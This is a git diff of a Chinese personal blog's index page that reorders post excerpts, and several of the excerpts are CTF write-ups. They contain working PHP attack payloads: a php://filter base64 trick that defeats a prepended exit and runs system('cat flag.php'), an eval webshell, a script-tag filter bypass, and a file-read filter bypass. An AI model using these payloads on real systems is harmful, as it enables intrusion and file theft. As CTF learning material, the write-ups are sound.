@@ -177,7 +177,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -191,7 +191,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">Java中的序列化和反序列化</a>
+            <a href="/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/" class="post-title-link" itemprop="url">MOCTF 死亡退出</a>
         </h1>
 
         <div class="post-meta">
@@ -202,7 +202,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:04:28" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:02:08" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -210,8 +210,8 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
                   </a>
                 </span>
             </span>
@@ -227,15 +227,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>众所周知，类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，该怎么做？这就可以通过序列化将数据转换为字节流。<br><strong>对象序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。<br>简言之，序列化就是在运行代码的时候，我们想保存多个对象的数据，就把内存里面的这些对象给变成一连串的字节。常见的就是变成文件，其实不序列化也可以保存文件，emmm</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+          <p><img src="https://img-blog.csdnimg.cn/20190716184119973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始就看到了源码，萌新表示大致看得懂什么意思，大致分析下：<br>第四行@$ c.=$ _POST[‘c’];    //@为屏蔽错误不显示在浏览器界面，$ _POST[‘c’]是以post的方式获取字符串类型的变量c,”.=”表示变量c会与之前变量中的<?php exit;?>进行字符串连接。很显然题目需要我们以post的方式提交变量c使<?php exit;?>失效。<br>@$filename = $_POST[‘file’];同理我们以post方式提交一个字符串的变量file，赋值给filename。<br>后面if判断，如果我们没有以post提交filename，就会运行空的tmp.php，否则就会把c的内容写入filename文件中并运行。<br>后来百度了一下，好像涉及php的filter协议，看了一下大佬的博客(<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，</a><br><img src="https://img-blog.csdnimg.cn/20190716184811333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>原理：<br>通过上传字符串变量c，通过<?php exit;?>与变量c连接破坏掉语句结构；同时变量c也需要写入到变量filename这个文件中通过执行获得flag。<br>在包含HTML、PHP语言的的网页中，通常会在进行解析XML将PHP的<??>语法当作为XML，而导致解析错误。为了防止这样的错误产生，php引入了php://filter协议流，通过该协议流可以将php的代码经过base64再编码一遍来避免此类冲突的产生。<br>可以巧妙运用base64解码的过程，将需要执行的php代码使用base64上传，再利用php:filter协议流进行base64解码执行。<br>base64解码过程会将&lt;、?、;、空格、&gt;等7个不合法字符忽略。从而导致<?php exit?>经过base64解码后变为phpexit。<br>base64算法解码是4个byte为一组，”phpexit”只有7个字符，这样会导致我们base64加密过后的密码，第一个字符被当作无效字符，从而破坏掉代码结构。</p>
+<p>实现：<br>1.编写我们希望在文件中执行的php代码，猜测flag放在flag.php文件中，构建代码让系统执行获取flag文件命令</p>
+<pre><code>&lt;?php system(&apos;cat flag.php&apos;);?&gt;</code></pre><p>2.最后的文件需要通过base64解密执行，所以需要对代码进行base64加密。<br><?php system('cat flag.php');?>加密后代码为：PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>3.写入的字符串是与<?php exit;?>连接后写入的，但是经过base64解密后phpexit只有7个字符我们需要随便加一个字符补充完整性（这里我选择的字符是a），防止在解密时候破坏我们加密的webshell。故变量c为aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>4.f9打开hackbar,以post方式提交c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php<br>f12查看即可得flag<br><img src="https://img-blog.csdnimg.cn/20190716191616722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm，萌新第一次写wp,借鉴了很多别人的，若有大佬看到错误，望指正<del>~</del>继续学习，加油！</p>
+
       
     </div>
 
@@ -339,7 +335,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/NWU-CTF%20web/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/MOCTF%20misc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -353,7 +349,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/02/03/NWU-CTF%20web/" class="post-title-link" itemprop="url">NWUCTF web</a>
+            <a href="/2020/02/03/MOCTF%20misc/" class="post-title-link" itemprop="url">MOCTF misc</a>
         </h1>
 
         <div class="post-meta">
@@ -364,7 +360,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:05:41" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:04:46" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -389,10 +385,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>NWUCTF刷题记录</p>
+          <p>刷题ing</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2020/02/03/NWU-CTF%20web/#more" rel="contents">
+              <a class="btn" href="/2020/02/03/MOCTF%20misc/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -501,7 +497,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/NWU-CTF%20web/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -515,7 +511,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/" class="post-title-link" itemprop="url">MOCTF 死亡退出</a>
+            <a href="/2020/02/03/NWU-CTF%20web/" class="post-title-link" itemprop="url">NWUCTF web</a>
         </h1>
 
         <div class="post-meta">
@@ -526,7 +522,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:02:08" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:05:41" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -551,11 +547,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><img src="https://img-blog.csdnimg.cn/20190716184119973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始就看到了源码，萌新表示大致看得懂什么意思，大致分析下：<br>第四行@$ c.=$ _POST[‘c’];    //@为屏蔽错误不显示在浏览器界面，$ _POST[‘c’]是以post的方式获取字符串类型的变量c,”.=”表示变量c会与之前变量中的<?php exit;?>进行字符串连接。很显然题目需要我们以post的方式提交变量c使<?php exit;?>失效。<br>@$filename = $_POST[‘file’];同理我们以post方式提交一个字符串的变量file，赋值给filename。<br>后面if判断，如果我们没有以post提交filename，就会运行空的tmp.php，否则就会把c的内容写入filename文件中并运行。<br>后来百度了一下，好像涉及php的filter协议，看了一下大佬的博客(<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，</a><br><img src="https://img-blog.csdnimg.cn/20190716184811333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>原理：<br>通过上传字符串变量c，通过<?php exit;?>与变量c连接破坏掉语句结构；同时变量c也需要写入到变量filename这个文件中通过执行获得flag。<br>在包含HTML、PHP语言的的网页中，通常会在进行解析XML将PHP的<??>语法当作为XML，而导致解析错误。为了防止这样的错误产生，php引入了php://filter协议流，通过该协议流可以将php的代码经过base64再编码一遍来避免此类冲突的产生。<br>可以巧妙运用base64解码的过程，将需要执行的php代码使用base64上传，再利用php:filter协议流进行base64解码执行。<br>base64解码过程会将&lt;、?、;、空格、&gt;等7个不合法字符忽略。从而导致<?php exit?>经过base64解码后变为phpexit。<br>base64算法解码是4个byte为一组，”phpexit”只有7个字符，这样会导致我们base64加密过后的密码，第一个字符被当作无效字符，从而破坏掉代码结构。</p>
-<p>实现：<br>1.编写我们希望在文件中执行的php代码，猜测flag放在flag.php文件中，构建代码让系统执行获取flag文件命令</p>
-<pre><code>&lt;?php system(&apos;cat flag.php&apos;);?&gt;</code></pre><p>2.最后的文件需要通过base64解密执行，所以需要对代码进行base64加密。<br><?php system('cat flag.php');?>加密后代码为：PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>3.写入的字符串是与<?php exit;?>连接后写入的，但是经过base64解密后phpexit只有7个字符我们需要随便加一个字符补充完整性（这里我选择的字符是a），防止在解密时候破坏我们加密的webshell。故变量c为aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>4.f9打开hackbar,以post方式提交c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php<br>f12查看即可得flag<br><img src="https://img-blog.csdnimg.cn/20190716191616722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm，萌新第一次写wp,借鉴了很多别人的，若有大佬看到错误，望指正<del>~</del>继续学习，加油！</p>
-
+          <p>NWUCTF刷题记录</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/02/03/NWU-CTF%20web/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -578,7 +578,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Referer/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/NWUCTF-misc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -592,7 +592,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/02/03/Referer/" class="post-title-link" itemprop="url">Referer</a>
+            <a href="/2020/02/03/NWUCTF-misc/" class="post-title-link" itemprop="url">NWUCTF misc</a>
         </h1>
 
         <div class="post-meta">
@@ -603,7 +603,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:06:31" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:06:07" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -611,8 +611,8 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
                   </a>
                 </span>
             </span>
@@ -628,10 +628,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>HTTP Referer</strong>是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p>
+          <p>NWUCTF刷题misc</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2020/02/03/Referer/#more" rel="contents">
+              <a class="btn" href="/2020/02/03/NWUCTF-misc/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -743,87 +743,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/NWUCTF-misc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ChanCherry">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChanCherry's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/NWUCTF-misc/" class="post-title-link" itemprop="url">NWUCTF misc</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:06:07" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF WP</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>NWUCTF刷题misc</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/02/03/NWUCTF-misc/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-	<div>
-		
-	</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/X-Forwarded-For/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -883,6 +802,101 @@
             </div>
           <!--/noindex-->
         
+      
+    </div>
+
+    
+    
+    
+
+	<div>
+		
+	</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/i%E6%98%A5%E7%A7%8B%20web%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B%20%E4%B9%9D%E6%9C%88%E5%9C%BA-Upload%20&%20code/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ChanCherry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ChanCherry's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/03/i%E6%98%A5%E7%A7%8B%20web%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B%20%E4%B9%9D%E6%9C%88%E5%9C%BA-Upload%20&%20code/" class="post-title-link" itemprop="url">i春秋 web“百度杯”CTF比赛九月场-Upload & code</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:01:21" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF WP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p><img src="https://img-blog.csdnimg.cn/20191013113205574.png" alt="在这里插入图片描述"><br>可以上传文件，并且上传之后可以点击源码链接打开文件，上传了这几句话：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($POST[<span class="string">"code"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果发现&lt;?php被过滤了，于是用php脚本标记来绕过过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"PHP"</span>&gt;</span><br><span class="line">$f=fopen(<span class="string">"../flag."</span>.strtolower(<span class="string">"PHP"</span>),<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span> fread($f,filesize(<span class="string">"../flag."</span>.strtolower(<span class="string">"PHP"</span>))); </span><br><span class="line">fclose($f);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>查看源码，点击/u/x.php即可得到flag。<br>这里附上PHP四种标记风格链接<a href="https://blog.csdn.net/qq_35085863/article/details/76714367" target="_blank" rel="noopener">https://blog.csdn.net/qq_35085863/article/details/76714367</a></p>
+<h1 id="code-考脑洞，你能过么？"><a href="#code-考脑洞，你能过么？" class="headerlink" title="code 考脑洞，你能过么？"></a>code 考脑洞，你能过么？</h1><p>题目打开是一张图片，<a href="http://154dd661c59a463aacb5d7f969774e19a5144eb67aee4c93.changame.ichunqiu.com/index.php?jpg=hei.jpg" target="_blank" rel="noopener">http://154dd661c59a463aacb5d7f969774e19a5144eb67aee4c93.changame.ichunqiu.com/index.php?jpg=hei.jpg</a><br><img src="https://img-blog.csdnimg.cn/20191013155448327.png" alt="在这里插入图片描述"><br>看url发现可能是文件包含，查看index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;154dd661c59a463aacb5d7f969774e19a5144eb67aee4c93.changame.ichunqiu.com&#x2F;index.php?jpg&#x3D;index.php</span><br></pre></td></tr></table></figure>
+<p>查看源码，得到一串base64编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;file:index.php&lt;/title&gt;&lt;img src=<span class="string">'data:image/gif;base64,PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIERhdGU6IDIwMTUvMTEvMTYNCiAqIFRpbWU6IDE6MzENCiAqLw0KaGVhZGVyKCdjb250ZW50LXR5cGU6dGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgnKTsNCmlmKCEgaXNzZXQoJF9HRVRbJ2pwZyddKSkNCiAgICBoZWFkZXIoJ1JlZnJlc2g6MDt1cmw9Li9pbmRleC5waHA/anBnPWhlaS5qcGcnKTsNCiRmaWxlID0gJF9HRVRbJ2pwZyddOw0KZWNobyAnPHRpdGxlPmZpbGU6Jy4kZmlsZS4nPC90aXRsZT4nOw0KJGZpbGUgPSBwcmVnX3JlcGxhY2UoIi9bXmEtekEtWjAtOS5dKy8iLCIiLCAkZmlsZSk7DQokZmlsZSA9IHN0cl9yZXBsYWNlKCJjb25maWciLCJfIiwgJGZpbGUpOw0KJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsNCg0KZWNobyAiPGltZyBzcmM9J2RhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCwiLiR0eHQuIic+PC9pbWc+IjsNCg0KLyoNCiAqIENhbiB5b3UgZmluZCB0aGUgZmxhZyBmaWxlPw0KICoNCiAqLw0KDQo/Pg=='</span>&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+<p>解码之后，得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><br><span class="line">$file = $_GET[<span class="string">'jpg'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看了wp之后，phpstorm新建项目会生成.idea文件夹，打开里面有workspace.xml，访问一下<a href="http://154dd661c59a463aacb5d7f969774e19a5144eb67aee4c93.changame.ichunqiu.com/.idea/workspace.xml" target="_blank" rel="noopener">http://154dd661c59a463aacb5d7f969774e19a5144eb67aee4c93.changame.ichunqiu.com/.idea/workspace.xml</a>，查看源码，发现有点东西，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;option value=<span class="string">"$PROJECT_DIR$/x.php"</span> /&gt;</span><br><span class="line">&lt;option value=<span class="string">"$PROJECT_DIR$/config.php"</span> /&gt;</span><br><span class="line">&lt;option value=<span class="string">"$PROJECT_DIR$/fl3g_ichuqiu.php"</span> /&gt;</span><br></pre></td></tr></table></figure>
+<p>于是直接访问fl3g_ichuqiu.php，发现不行<code>╮(╯▽╰)╭</code>那么还可以通过index.php来读文件（访问<code>index.php?jpg=fl3g_ichuqiu.php</code>），但是不难发现过滤了大小写数字字符以外的其他字符，也就是说_被过滤了，但是又发现config会被替代成_也就可以绕过过滤了。所以payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?jpg=fl3gconfigichuqiu.php</span><br></pre></td></tr></table></figure>
+<p>又是一串base64，转一下，得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span 